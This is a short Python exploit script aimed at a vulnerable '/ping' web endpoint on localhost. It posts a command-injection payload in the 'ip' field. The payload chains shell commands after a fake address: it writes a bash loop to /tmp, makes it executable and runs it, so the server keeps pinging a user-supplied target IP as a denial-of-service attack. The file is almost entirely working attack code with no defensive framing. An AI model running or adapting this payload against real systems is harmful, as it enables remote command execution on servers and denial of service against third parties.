import requests

# Target URL for the vulnerable endpoint
url = "http://127.0.0.1:5000/ping"

# Ask user for the IP address to target for the DoS attack
target_ip = input("Enter the target IP address for the DoS attack: ")

# Construct the malicious payload
malicious_code = f"#!/bin/bash\nwhile true; do ping -c 1 {target_ip}; done"
payload = f"127.0.0.1 && echo '{malicious_code}' > /tmp/malicious.sh; chmod +x /tmp/malicious.sh; /tmp/malicious.sh"

# Data to be sent in the POST request
data = {
    "ip": payload
}

try:
    # Send the malicious payload to the server
    response = requests.post(url, data=data)
    
    # Print the response from the server
    print(f"Response from server: {response.text}")

except requests.RequestException as e:
    print(f"Failed to send payload: {str(e)}")
